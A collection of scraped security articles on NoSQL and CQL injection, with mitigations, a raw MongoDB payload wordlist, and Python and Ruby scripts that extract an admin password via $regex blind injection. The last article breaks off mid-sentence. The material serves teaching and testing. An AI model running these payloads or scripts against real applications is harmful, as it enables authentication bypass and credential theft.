[
  {
    "content": "I would like to show you a simple technique that can be effectively used against modern web applications, such as those written on top of NodeJS and MongoDB. In essence, this technique is very similar to SQL Injection (SQLI) although much simpler because we do not have to complete any weird and complicated strings. Before I move on, I would like to state that although I talk about NodeJS, in the examples below I use ExpressJS, which is the most popular web framework for node and a de facto standard in the NodeJS community. The SQL Injection Primer The first thing you learn when studying SQL Injection is how to create true statements. Let's consider the following example SQL statement that is used to authenticate the user when the username and the password are submitted to the application: SELECT * FROM users WHERE username = '$username' AND password = '$password' \nIf this statement is not prepared or properly handled when constructed, an attacker may be able to place ' or 1=1-- in the username field in order to construct a statement that looks more or less like the one below, which is known as the classic login bypass via SQLI: SELECT * FROM users WHERE username = '' or 1=1--' AND password = '' \nEven today, this classic attack and its variations are wildly used to detect the presence of improper handling of SQL statements. The MongoDB Injection Primer Now, even though SQL Injection is still a popular attack vector, it is no longer as widespread as it used to be. Many modern web applications opt to use a much simpler storage mechanism such as the one provided by NoSQL databases like MongoDB. NoSQL databases not only promise simplified development but also improved security by eliminating the SQL language entirely and relying on a much simpler and structured query mechanism that is typically found in the form of JSON and JavaScript. The SQL statement that we used above to query the user login details will be written like this in MongoDB: db.users.find({ username: username, password: password }) \nAs you can see we no longer deal with a query language in the form of a string; therefore one would think that injection is no longer possible. And of course, as it is always the case with security, they would be wrong because there are many factors at play. For example, if we assume that the username field, or parameter if you like, is coming from a deserialized JSON object, manipulation of the above query is not only possible but inevitable. For example, if one supplies a JSON document as the input to the application, an attacker will be able to perform the exact same login bypass that was before possible only with SQL injection: {\n  \"username\": { \"$gt\": \"\" },\n  \"password\": { \"$gt\": \"\" }\n} The actual vulnerable handler of the request will look more or less like this: app.post('/', function (req, res) { db.users.find( { username: req.body.username, password: req.body.password }, function (err, users) { // TODO: handle the rest } ) }) In the above ExpressJS handler, the username and password fields are not validated to ensure that they are strings. Therefore, when the JSON document is deserialized, those fields may contain anything but strings and can be used to manipulate the structure of the query. In MongoDB, the field $gt has a special meaning, which is used as the greater-than comparator. As such, the username and the password from the database will be compared to the empty string \"\" and as a result return a positive outcome, i.e. a true statement. The request to exploit this vulnerability will look more or less like the one below. Use this link to open the request in Rest: POST http://target/ HTTP/1.1 Content-Type: application/json \n{\n\t\"username\": {\"$gt\": \"\"},\n\t\"password\": {\"$gt\": \"\"}\n} Taking NodeJS and MongoDB Exploitation Further In the example above I deliberately chose to use JSON as the transport mechanism because it makes this attack easier to explain. While it is not unusual to see JSON documents as the communication mechanism, they are not as widespread as url-encoded key-value pairs, simply known as urlencoding. One would think that if you just use body and query parameters in urlencoding format then you will be safe. In ExpressJS we can still achieve the bypass effect without using JSON at all but with simple query strings. For example, we can submit a request like the one illustrated below. Use this link to open the request in Rest: POST http://target/ HTTP/1.1 Content-Type: application/x-www-form-urlencoded \nusername[$gt]=&password[$gt]= The string username[$gt]= is a special syntax used by the qs module (default in ExpressJS and the body-parser middleware). This syntax is the equivalent of making a JavaScript object/hash with a single parameter called $gt mapped to no value. In essence, the request above will result in a JavaScript object that looks like the one illustrated below: {\n  \"username\": { \"$gt\": undefined },\n  \"password\": { \"$gt\": undefined }\n} If you compare this object with the one that we used in the previous example, you can see that logically they are the same. Once again, we have defeated the authentication mechanism to login as the first user in the database which is probably the administrator. This technique can be extended even further with additional MongoDB operators as per the official documentation. Learning By Example I believe that the best way to learn new things is to experience them first hand. Therefore, I have created two projects that illustrate this vulnerability in practice. The first project uses normal urlencoded form values while the second project uses JSON (AngularJS). Both projects can be found on our GitHub portal. You need docker in order to run them. I will save myself the trouble going into details about how docker works. Just read the projects' README file for more information. Testing For MongoDB Injection I hope you now have a good idea of the kind of attacks we can perform against NodeJS and MongoDB applications. In practice, I have seen great success using the technique above and its variations when performing manual investigations. However, I am also a big fan of automation so, for the fans of Websecurify Suite, I have personally incorporated these tests in both Formfuzz and Jsonfuzz tools. To make it simpler, I have implemented a new escapemode command called use_mongodb_payloads. Once you execute the command, the fuzzer will not only use MongoDB specific payloads but also do mutation of the query to achieve maximum depth. Once the escapemode command is executed, the fuzzer will produce requests similar to the one illustrated in the screenshot. As you can clearly see we bypassed the login screen in just a few seconds by using the Formfuzz fuzzer. I hope this post helps you get some understanding about the kind of problems you may experience if you are using NodeJS and MongoDB together.",
    "source": "https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb",
    "metadata": {
      "title": "Hacking NodeJS and MongoDB"
    }
  },

  {
    "content": "TL;DR\\nThe solution is to design your application to accept only strings from your users (never allow objects by design) and sanitize the inputs before using them (mongo-sanitize is a good module for this).\\nSQL Injection\\nIn relational databases, SQL Injection is a widely known attack where the malicious user may fill a web form with SQL statements in order to change existing data or to obtain more info than it's allowed to. If an application builds its queries concatenating a base statement with a variable whose value is set through a input field, this application can be susceptible to this kind of attack.\\nFor example:\\nvar query = \\\"SELECT * FROM Users WHERE name = '\\\" + userName + \\\"';\\\";\\n\\nIf the userName variable is set with John Doe'; DROP TABLE Users; --, the result would be:\\nSELECT * FROM Users WHERE name = 'John Doe'; DROP TABLE Users; --';\\n\\nAs a Users table is a pretty common table name for most websites, the attacker could guess that a table with this name would exist without knowing for sure. He would also need luck that no foreign key would prevent the drop table command, but the idea is that he'll try and we need to prevent those attacks. Another example is to use ' OR '' = ' to retrieve all data instead of just one record.\\nIn the relational world, this attack can be prevented using prepared statements, where you use placeholders for each parameter and the database engine will not execute random SQL statements.\\nNoSQL Injection\\nNoSQL Injection is the equivalent for the NoSQL world. The attack tries to inject code when the inputs are not sanitized and the solution is simply to sanitize them before using.\\nFor example, using Node. js and MongoDB:\\napp. post('/user', function (req, res) {\\n var query = {\\n username: req. body. username,\\n password: req. body. password\\n }\\n db. collection('users'). findOne(query, function (err, user) {\\n console. log(user);\\n });\\n});\\n\\nSuppose that we receive the following request:\\nPOST http://www. example. com/user HTTP/1. 1\\nContent-Type: application/json\\n{\\n \\\"username\\\": {\\\"$ne\\\": null},\\n \\\"password\\\": {\\\"$ne\\\": null}\\n}\\nAs $ne is the not equal operator, this request would return the first user (possibly an admin) without knowing its name or password.\\nThe solution in this case is to sanitize the input before using them. A good options is mongo-sanitize:\\n\\nIt will strip out any keys that start with '$' in the input, so you can pass it to MongoDB without worrying about malicious users overwriting.\\n\\nSafe:\\nvar sanitize = require('mongo-sanitize');\\napp. post('/user', function (req, res) {\\n var query = {\\n username: sanitize(req. body. username),\\n password: sanitize(req. body. password)\\n }\\n db. collection('users'). findOne(query, function (err, user) {\\n console. log(user);\\n });\\n});\\n\\nMongoose\\nIf you are using Mongoose, you don't need to sanitize the inputs. In this case, you just need to set the properties to be typed as string. If someone passes an object like { $ne: null }, Mongoose will convert it to a string and no harm will be done.\\nThe $where operator attack\\nThe $where operator has a very dangerous feature: it allows you to pass a string that will be evaluated inside your server.\\nTo reproduce the problem, suppose that you have an online store and want to find out which users have more than X canceled orders. You could query as the following:\\nvar query = {\\n $where: \\\"this. canceledOrders > \\\" + req. body. canceledOrders\\n}\\ndb. collection('users'). find(query). each(function(err, doc) {\\n console. log(doc);\\n})\\n\\nIn this case, mongo-sanitize will not help you if the input string is '0; return true'. Your where clause will be evaluated as this. canceledOrders > 0; return true and all users would be returned.\\nOr you could receive '0; while(true){}' as input and suffer a DoS attack.\\nIt also works for string inputs, like:\\nvar query = {\\n $where: \\\"this. name === '\\\" + req. body. name + \\\"'\\\"\\n}\\n\\nThe attack could be the string '\\\\'; return \\\\'\\\\' == \\\\'' and the where clause would be evaluated to this. name === ''; return '' == '', that results in returning all users instead of only those who matches the clause.\\nThe solution here is to never use the $where operator. Why? I list it here:\\n\\nPerformance: since you can run arbitrary JavaScript code, the $where operator is not optimized. That means: indexes will be ignored.\\n\\nScope is not accessible: the solution to avoid the code injection would be to add the where clause inside a function, like the following:\\nvar query = {\\n $where: function() {\\n return this. canceledOrders > threshold\\n }\\n}\\n\\nHowever, it won't work. The local variable value is not passed to Mongo and it returns the following error if executed in shell: (thanks to @Utaal)\\nError: error: {\\n \\\"$err\\\" : \\\"ReferenceError: threshold is not defined\\\\n at _funcs2 (_funcs2:1:45) near 's. canceledOrders > threshold }' \\\",\\n \\\"code\\\" : 16722\\n}\\n\\nAlso, the Node. js Mongo driver version 2. 1 has a bug. If you pass a function to your $where clause it will be completely ignored and {} will be used instead (which returns everything).\\n\\nThere is always a better solution. In this case, you could use the operators $eq or $gt.\\n\\n\\nMore\\nIf you want to read more about this subject, I suggest this blog post that contains code examples and a GitHub project to reproduce the attacks.\\nAs a rule of thumb, always follow the principle of least privilege: to minimize the potential damage that an attacker can make, do not assign full-access to your application. Run using only the permissions that you need.",
    "source": "https://zanon.io/posts/nosql-injection-in-mongodb",
    "metadata": {
      "title": "NoSQL Injection in MongoDB"
    }
  },

  {
    "content": "As described by Wikipedia, NOSQL is a movement promoting a loosely defined class of non-relational data stores that break with a long history of relational databases. These types of databases are quickly gaining popularity in the Web2. 0 world, including sites like Facebook and Digg. As you might imagine from the name, having no SQL, means having no SQL injection. But does that make them completely secure for use, or can similar injection attacks be performed against applications using these kinds of databases?MongoDBI'll use MongoDB as the target of this blog post. MongoDB is a document-storage database, storing the documents as JSON BSON. MongoDB features a rich set of possibilites for querying the database. The query language is also JSON BSON, but also supports expressing it as JSON(updated 2010-07-06). As you can imagine this could open for JSON-injection. Consider this query:db. foo. find( { $or : [ { a : 1 } , { b : 2 } ] } )If the number 2 in the query above was coming from concatenation of string input, we might get the following injection:db. foo. find( { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] } )MongoDB also allows you to query by javascript expressions like this:db. myCollection. find( { $where: \\\"this. a > 3\\\" } );Again I can imagine bad things happening, if parts of what's in the javascript expression, comes from input. There are good news though. This query interface really seems to encourage building language supported, fluent APIs. The . NET implementation called mongodb-net, has a syntax like this: coll. FindOne(Where. Field(a => a == 1)); As we can see the query language is mirrored in C#, and if implemented properly, this encourages the developers using the API to use a syntax where you don't have to think about mixed contexts (control characters etc.). Given that the database driver is correctly implemented, this should help developers implement this in a secure way. Another implementation called mongodb-sharp supports Linq, which in many ways does the same thing. Other types of NoSQL databasesThere are loads of other NOSQL databases, like Couchdb, Cassandra and Neo4j. I'll probably have a look at some more of these in future blog posts, but in general I guess you could say that if there is a query language, it's usually possible to perform an injection attack (QL-injection - Query Language injection) in one way or another. Just in case someone gets the wrong idea, these security flaws would be flaws in the application generating the query - not in the NOSQL database engine. Same thing holds for regular SQL injection. Update 2011-03-09NoSQL-injection in php when using MongoDB \\n \\nPermalink |\\n \\n\\n\\n\\n\\n\\nJuly 6, 2010 - 21:14 UTC\\nMathias Stearn\\n\\n\\n Mongo queries aren't JSON strings, although we do provide an interface to convert from JSON to a mongo object (BSON). Since the usual way to build a query object is something like queryObj. append(\\\"b\\\", 2) it is *impossible* for that 2 to cause an injection, even if it is a string, not a number. ",
    "source": "https://erlend.oftedal.no/blog/static-110.html",
    "metadata": {
      "title": "[Security] NOSQL-injection"
    }
  },

  {
    "content": "NoSQL Injection — NoSQL databases trade relational constraints for scalability but remain vulnerable to injection via JSON-based queries and operators (e.g. $ne, $gt, $lt, $regex, $in, $where); this doc covers summary & tools (NoSQLMap, nosqlilab, Burp-NoSQLiScanner), methodology (operator injection, authentication bypass using $ne/$gt, extracting length/data via $regex and $in, WAF/filter evasion and duplicate-key behavior), blind NoSQL techniques with examples for POST (JSON and urlencoded) and GET (Python and Ruby scripts for blind enumeration), labs (Root Me challenges), and references (OWASP, SensePost, Soroush Dalili, Zanon, cr0hn, Geluchat, etc.).",
    "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/NoSQL%20Injection/README.md",
    "metadata": {
      "title": "NoSQL Injection"
    }
  },

  {
    "content": "true, $where: '1 == 1', $where: '1 == 1'$where: '1 == 1'', $where: '1 == 11, $where: '1 == 1'{ $ne: 1 }', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'db.injection.insert({success:1});db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1|| 1==1|| 1==1//|| 1==1%00}, { password : /.*/ }' && this.password.match(/.*/)//+%00' && this.passwordzz.match(/.*/)//+%00'%20%26%26%20this.password.match(/.*/)//+%00'%20%26%26%20this.passwordzz.match(/.*/)//+%00{$gt: ''}[$ne]=1';sleep(5000);';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}{\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}}{\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}}{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}{\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}}",
    "source": "https://raw.githubusercontent.com/cr0hn/nosqlinjection_wordlists/refs/heads/master/mongodb_nosqli.txt",
    "metadata": {
      "title": "MongoDB NoSQL Injection Wordlist"
    }
  },

  {
    "content": "Is it possible to perform NoSQL injection attacks using Cassandra Query Language (CQL)? Invicti security researchers investigated CQL injection against applications that use the Apache Cassandra database. You information will be kept Private\\n\\n\\n\\n\\nTable of ContentsWhile working on new security checks, our security research team at Invicti looked at the possibilities of automating injection attacks for many types of NoSQL databases. This post summarizes our findings about query language injection attacks against Apache Cassandra and shows why such CQL injections are difficult to perform and automate. What is Apache Cassandra?Apache Cassandra is a free, open-source, distributed NoSQL database. The project was first started in early 2009 and is now one of the most commonly used NoSQL databases. Organizations choose Cassandra for its ability to scale up very fast and seamlessly. It is specifically designed for use cases that require large transaction volumes distributed across different geographical areas. How is Cassandra different from other databases?Unlike other NoSQL databases, Cassandra stores its data in rows and columns, so at first glance, it may appear similar to relational databases. However, in a Cassandra table, each row is a single piece of structured data, while the columns are used to define partitions and partition keys. Cassandra uses partitions to efficiently distribute data across any number of interconnected nodes (instances), with provisions for replicating data across multiple nodes for high availability, disaster recovery, and improved performance. There are many other interesting aspects of Cassandra database structure, architecture and data modeling â see the official Cassandra documentation to learn more. What is Cassandra Query Language (CQL)?The Cassandra Query Language (CQL) is the primary language for communicating with Apache Cassandra databases. A Thrift API was also available in the past but is no longer supported as of Cassandra version 4. In any case, CQL is easier to use than the Thrift API, especially as it is very similar to SQL. Most of the basic operators, keywords, and identifiers in CQL are similar to those used in SQL. However, since Cassandra has its own data model and structure that is not based on relational tables, CQL has some unique features and keywords, like KEYSPACE or USING TTL. Conversely, some relational clauses are missing from CQL, notably JOIN, FOREIGN KEY, and UNION. The importance of CQL client driversTo connect to a Cassandra database from your application, you need the right client driver. Because each new version of Cassandra brings major changes to the database and the CQL language, there are lots of client drivers available, though most are specific to one version and not maintained beyond that. The most commonly used drivers are developed by DataStax (a company that offers a commercial database based on Cassandra), so open-source DataStax drivers are what we used for our application security research. Crucially, the client drivers can also provide some additional security features.Â Exploring CQL injectionInjection attacks are possible wherever you have unsanitized user input being passed to a back-end system, including a database. Unlike traditional SQL injection, where you can use broadly the same attack techniques for all relational databases, NoSQL injection requires attacks aimed at specific databases, with MongoDB being probably the most popular target. The same approach should work against a Cassandra database, using carefully crafted CQL queries to perform CQL injection attacks. Using CQL injection for unauthenticated accessTo test if CQL injection is possible, we created a vulnerable login page that does a simple database lookup using unsanitized user input. The application queries a Cassandra database that has a users table, using the following unsafe CQL query to authenticate users:SELECT * FROM users WHERE username='[user_input]' AND password='[user_input]' ALLOW FILTERING;In this case, the following user inputs will be enough to perform a CQL injection attack for an authentication bypass:Username: admin'/*Password: */ and password >'The resulting query will be:SELECT * FROM users WHERE username='admin'/*' AND password='*/ and password >'' ALLOW FILTERING;The query was supposed to look for a valid user and password combination, but the injection payload has commented out the password lookup and only checks if a password exists. This query will run successfully, potentially allowing an attacker to log in as admin without knowing the password. This kind of payload can be useful to at least confirm that injection is possible, but to automate the attack and obtain confirmation, we needed more. Unfortunately, at the moment, there are no known payloads to extract additional information from the table or the database itself. This is mainly due to numerous limitations imposed by the CQL language and client drivers when compared to typical SQL injection techniques. Why CQL injection is harder than SQL injectionSQL injections are among the oldest and best-researched web attacks, and CQL syntax is very similar to SQL, so it makes sense to try and apply SQLi techniques to CQL injection. As we found out, seemingly minor differences compared to SQL add up to become serious limitations that prevented us from using typical SQL injection techniques. The limitations below were identified and tested in a test environment with Cassandra 4. 0. 3, a DataStax Python driver 3. 25. 0, and a Python application based on Flask. Missing injection-friendly language constructs and functionsSQL injections extensively use table joining operations to grab data from additional tables (union-based in-band SQL injection). Cassandra is a non-relational database, so there are no JOIN or UNION statements in CQL, making it hard to access other tables. Cassandra has no convenient built-in functions like DATABASE() or USER() to retrieve database information. There is no OR operator in CQL, so we canât use it to set up always-true conditions â a CQL query like SELECT * FROM table WHERE col1='a' OR col2='b'; will be rejected. Time-based blind SQL injections rely on using SLEEP() or a similar function to induce a delay, but there is no SLEEP() function in CQL, making time-based injections very hard (if not impossible). There are no built-in functions that could be used to send network requests, so there is no easy way to perform out-of-band verification (typically done by listening for DNS resolution requests) as with out-of-band SQL injections. WHERE clause limitationsColumns that do not have secondary indexes cannot be filtered with WHERE clauses. For example, if column col1 is not a primary key and does not have a secondary index, the following CQL query will be rejected by the database: SELECT * FROM table WHERE col1='asd';Only valid column names can be specified in WHERE clauses (unlike in SQL), so trying to add an always-true condition like SELECT * FROM table WHERE column1='a' AND '1'='1'; will not work as there is no column named '1'. This greatly limits the scope of available payloads, especially for boolean-based detection and attempts to make a query return all rows in a table. SELECT clause limitationsCQL does not support echo-type queries such as SELECT 'text'; or SELECT 3;, eliminating a useful technique for further exploitation and confirmation. A fundamental SQLi technique is to discard the end of a query by injecting a comment. When trying this with CQL in our application test environment, a query like SELECT * FROM table WHERE user='admin';// AND pass='pass'; fails. Note that this query is syntactically correct and works when directly connected to a Cassandra database. However, our tests found that the application client drivers donât allow comments at the end of queries. This is another major limitation since we are now restricted to only using valid queries and conditions. Restrictions on keysIf a Cassandra database specifies some restrictions on its clustering keys but not on its partition keys, queries will not work without the ALLOW FILTERING keyword. To make matters worse, ALLOW FILTERING can only be specified at the end of a query, which limits our injection options to the last condition in a WHERE clause (injecting anywhere else would result in an invalid query that would be rejected). Queries are rejected if you do not specify all the clustering key columns. For example, if col3 is part of a clustering key, a query like SELECT * FROM table WHERE col1='a' and col2='b' and col3='c' and col4='d' and col5='e'; would work, but SELECT * FROM table WHERE col1='a' and col2='b' and col4='d' and col5='e'; would be rejected because col3 is missing. In practice, this means an attacker would need to know all the clustering key columns to prepare a valid payload. No nested or stacked queriesCQL does not allow subqueries or other nested statements, so a query like SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1); would be rejected. This eliminates many classic SQL injection tricks, especially for boolean-based injections. Client drivers for CQL do not allow stacked queries (multiple queries separated by semicolons). This means we will not be able to run arbitrary queries by stacking them. CQL lets you create user-defined functions (UDF) that can include arbitrary code. In the past, this feature has caused vulnerabilities such as remote code execution via CVE-2021-44521. However, since we cannot run stacked queries, we will not be able to create user-defined functions without directly connecting to the database. CQL injections in the wildCQL injection is still a relatively new topic, and while there are some blog posts out there, a lot of the information you will find is outdated or inaccurate. We examined existing posts about potential CQL injection scenarios like the one shown earlier and found that most of the suggested injection payloads donât work, at least not in our test environment. As of this writing, no CQL injection vulnerabilities have been found and disclosed in bug bounty programs. There are also no CVEs assigned to CQL injection vulnerabilities (except for the special case of user-defined functions mentioned above). No open-source tools are available for finding CQL injections, and almost all existing NoSQL injection tools are specific to MongoDB injection, with no specific CQL injection payloads. Mitigating CQL injection vulnerabilitiesAll injection attacks are made possible by applications directly using unsanitized user-controllable data. As with SQL injection vulnerabilities, you can eliminate the risk of CQL injections by using parameterized queries (prepared statements) that prevent raw user input from making it into database queries. For example, the following CQL query uses parameterized queries:const query = 'SELECT * FROM table WHERE col1=? and col2 =?';const params = ['username', 'password'];client. execute(query, params, { prepare: true }, callback);In addition to using parameterized queries, it is always good practice to validate and filter user inputs, and also to apply context-sensitive encoding depending on how the data is used. Is Apache Cassandra secure from injection attacks?Our tests have shown that, like other NoSQL injection types, CQL injection attacks are technically possible. However, due to the limitations imposed by both the CQL language itself and the client drivers, it is really difficult to perform any practically useful CQL injections and exploit them further. Despite the syntactic similarities between SQL and CQL, very few of the standard SQL injection techniques can be successfully used against Cassandra databases. Other than the very limited example described above, we have found no way to perform useful CQL injection attacks or extract data using any of the known techniques in our test environment. This makes Apache Cassandra a pretty secure database choice when it comes to injections, especially if elementary secure coding practices are followed in development. However, this is still a new area of study with lots of room for research on bypassing the limitations posted here, so it is likely that new methodologies will eventually emerge for exploiting CQL injection vulnerabilities. ",
    "source": "https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra",
    "metadata": {
      "title": "Investigating CQL injection in Apache Cassandra"
    }
  },

  {
    "content": "NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.\\n\\n## Summary\\n\\n* [Tools](#tools)\\n* [Methodology](#methodology)\\n * [Operator Injection](#operator-injection)\\n * [Authentication Bypass](#authentication-bypass)\\n * [Extract Length Information](#extract-length-information)\\n * [Extract Data Information](#extract-data-information)\\n * [WAF and Filters](#waf-and-filters)\\n* [Blind NoSQL](#blind-nosql)\\n * [POST with JSON Body](#post-with-json-body)\\n * [POST with urlencoded Body](#post-with-urlencoded-body)\\n * [GET](#get)\\n* [Labs](#references)\\n* [References](#references)\\n\\n## Tools\\n\\n* [codingo/NoSQLmap](https://github. com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool\\n* [digininja/nosqlilab](https://github. com/digininja/nosqlilab) - A lab for playing with NoSQL Injection\\n* [matrix/Burp-NoSQLiScanner](https://github. com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.\\n\\n## Methodology\\n\\nNoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.\\n\\n### Operator Injection\\n\\n| Operator | Description |\\n| -------- | ------------------ |\\n| $ne | not equal |\\n| $regex | regular expression |\\n| $gt | greater than |\\n| $lt | lower than |\\n| $nin | not in |\\n\\nExample: A web application has a product search feature\\n\\n```js\\ndb. products. find({ \\\"price\\\": userInput })\\n```\\n\\nAn attacker can inject a NoSQL query: `{ \\\"$gt\\\": 0 }`.\\n\\n```js\\ndb. products. find({ \\\"price\\\": { \\\"$gt\\\": 0 } })\\n```\\n\\nInstead of returning a specific product, the database returns all products with a price greater than zero, leaking data.\\n\\n### Authentication Bypass\\n\\nBasic authentication bypass using not equal (`$ne`) or greater (`$gt`)\\n\\n* HTTP data\\n\\n ```ps1\\n username[$ne]=toto&password[$ne]=toto\\n login[$regex]=a.*&pass[$ne]=lol\\n login[$gt]=admin&login[$lt]=test&pass[$ne]=1\\n login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto\\n ```\\n\\n* JSON data\\n\\n ```json\\n {\\\"username\\\": {\\\"$ne\\\": null}, \\\"password\\\": {\\\"$ne\\\": null}}\\n {\\\"username\\\": {\\\"$ne\\\": \\\"foo\\\"}, \\\"password\\\": {\\\"$ne\\\": \\\"bar\\\"}}\\n {\\\"username\\\": {\\\"$gt\\\": undefined}, \\\"password\\\": {\\\"$gt\\\": undefined}}\\n {\\\"username\\\": {\\\"$gt\\\":\\\"\\\"}, \\\"password\\\": {\\\"$gt\\\":\\\"\\\"}}\\n ```\\n\\n### Extract Length Information\\n\\nInject a payload using the $regex operator. The injection will work when the length is correct.\\n\\n```ps1\\nusername[$ne]=toto&password[$regex]=.{1}\\nusername[$ne]=toto&password[$regex]=.{3}\\n```\\n\\n### Extract Data Information\\n\\nExtract data with \\\"`$regex`\\\" query operator.\\n\\n* HTTP data\\n\\n ```ps1\\n username[$ne]=toto&password[$regex]=m.{2}\\n username[$ne]=toto&password[$regex]=md.{1}\\n username[$ne]=toto&password[$regex]=mdp\\n\\n username[$ne]=toto&password[$regex]=m.*\\n username[$ne]=toto&password[$regex]=md.*\\n ```\\n\\n* JSON data\\n\\n ```json\\n {\\\"username\\\": {\\\"$eq\\\": \\\"admin\\\"}, \\\"password\\\": {\\\"$regex\\\": \\\"^m\\\" }}\\n {\\\"username\\\": {\\\"$eq\\\": \\\"admin\\\"}, \\\"password\\\": {\\\"$regex\\\": \\\"^md\\\" }}\\n {\\\"username\\\": {\\\"$eq\\\": \\\"admin\\\"}, \\\"password\\\": {\\\"$regex\\\": \\\"^mdp\\\" }}\\n ```\\n\\nExtract data with \\\"`$in`\\\" query operator.\\n\\n```json\\n{\\\"username\\\":{\\\"$in\\\":[\\\"Admin\\\", \\\"4dm1n\\\", \\\"admin\\\", \\\"root\\\", \\\"administrator\\\"]},\\\"password\\\":{\\\"$gt\\\":\\\"\\\"}}\\n```\\n\\n### WAF and Filters\\n\\n**Remove pre-condition**:\\n\\nIn MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.\\n\\n```js\\n{\\\"id\\\":\\\"10\\\", \\\"id\\\":\\\"100\\\"} \\n```\\n\\nIn this case, the final value of \\\"id\\\" will be \\\"100\\\".\\n\\n## Blind NoSQL\\n\\n### POST with JSON Body\\n\\nPython script:\\n\\n```python\\nimport requests\\nimport urllib3\\nimport string\\nimport urllib\\nurllib3. disable_warnings()\\n\\nusername=\\\"admin\\\"\\npassword=\\\"\\\"\\nu=\\\"http://example. org/login\\\"\\nheaders={'content-type': 'application/json'}\\n\\nwhile True:\\n for c in string. printable:\\n if c not in ['*','+','. ','?','|']:\\n payload='{\\\"username\\\": {\\\"$eq\\\": \\\"%s\\\"}, \\\"password\\\": {\\\"$regex\\\": \\\"^%s\\\" }}' % (username, password + c)\\n r = requests. post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\\n if 'OK' in r. text or r. status_code == 302:\\n print(\\\"Found one more char : %s\\\" % (password+c))\\n password += c\\n```\\n\\n### POST with urlencoded Body\\n\\nPython script:\\n\\n```python\\nimport requests\\nimport urllib3\\nimport string\\nimport urllib\\nurllib3. disable_warnings()\\n\\nusername=\\\"admin\\\"\\npassword=\\\"\\\"\\nu=\\\"http://example. org/login\\\"\\nheaders={'content-type': 'application/x-www-form-urlencoded'}\\n\\nwhile True:\\n for c in string. printable:\\n if c not in ['*','+','. ','?','|','&','$']:\\n payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)\\n r = requests. post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\\n if r. status_code == 302 and r. headers['Location'] == '/dashboard':\\n print(\\\"Found one more char : %s\\\" % (password+c))\\n password += c\\n```\\n\\n### GET\\n\\nPython script:\\n\\n```python\\nimport requests\\nimport urllib3\\nimport string\\nimport urllib\\nurllib3. disable_warnings()\\n\\nusername='admin'\\npassword=''\\nu='http://example. org/login'\\n\\nwhile True:\\n for c in string. printable:\\n if c not in ['*','+','. ','?','|', '#', '&', '$']:\\n payload=f\\\"?username={username}&password[$regex]=^{password + c}\\\"\\n r = requests. get(u + payload)\\n if 'Yeah' in r. text:\\n print(f\\\"Found one more char : {password+c}\\\")\\n password += c\\n```\\n\\nRuby script:\\n\\n```ruby\\nrequire 'httpx'\\n\\nusername = 'admin'\\npassword = ''\\nurl = 'http://example. org/login'\\n# CHARSET = (?!..?~). to_a # all ASCII printable characters\\nCHARSET = [*'0'.. '9',*'a'.. 'z','-'] # alphanumeric + '-'\\nGET_EXCLUDE = ['*','+','. ','?','|', '#', '&', '$']\\nsession = HTTPX. plugin(:persistent)\\n\\nwhile true\\n CHARSET. each do |c|\\n unless GET_EXCLUDE. include?(c)\\n payload = \\\"?username=#{username}&password[$regex]=^#{password + c}\\\"\\n res = session. get(url + payload)\\n if res. body. to_s. match?('Yeah')\\n puts \\\"Found one more char : #{password + c}\\\"\\n password += c\\n end\\n end\\n end\\nend\\n```",
    "source": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/NoSQL%20Injection/README.md",
    "metadata": {
      "title": "NoSQL Injection"
    }
  },

  {
    "content": "TL;DR How to do NoSQL error-based injection\\nIn this second blog post (read the first one here), on NoSQL injection, I discuss how to do error-based injection. I think this might be a novel approach – at least my Google search-fu isn’t finding anything.\\nWhen trying to extract information via NoSQL injection, you typically make use of Boolean conditions to figure out a character. Portswigger has a couple of examples here.\\nIn one of Portswigger’s examples, they consider the case where you can look up another user’s profile via a website that’s vulnerable to NoSQL $where injection. To get the first char of the admin user’s password, we then use the payload admin' && this. password[0] == 'a' || 'a'=='b\\nThis will make the query \\n{\\\"$where\\\":\\\"this. username =='admin' && this. password[0] == 'a'||'a'=='b' \\\"}\\nBreaking this down, we are saying:\\n\\nProvide all documents where username is set to admin\\nAND where the first character of the password is an a\\nOR where a==b (this will always be false)\\n\\nIn practice, the admin user’s info will only return if their password starts with the a character. So, if we don’t get any data back, we move on to b then c and so forth, until we have the first character. Then we move on to the second character.\\nIn case we are not injecting into $where, we can in some cases make use of the $regex operator for a similar effect. In this case, we would inject the \\\"{\\\"$regex\\\":\\\"^a*\\\"} so that the query becomes\\n{\\\"username\\\":\\\"admin\\\",\\\"password\\\":{\\\"$regex\\\":\\\"^a*\\\"}}\\nThis will return the user’s info in case their password starts with an a. You can then add character by character to the regex, until you have the full value. You can also make use of sleep in $where based injection, to cause a delay – for instance if the password’s first character is an a, otherwise return immediately.\\nThese approaches are obviously very slow, and I wanted a quick way to extract a full document, including field names I didn’t know. Unfortunately, NoSQL Injection doesn’t really have an equivalent to union or stacked query injection, unless you are injecting into an aggregate pipeline.\\nHowever, NoSQL does produce error messages, which made me think that you could get error-based injection going, which is typically quite 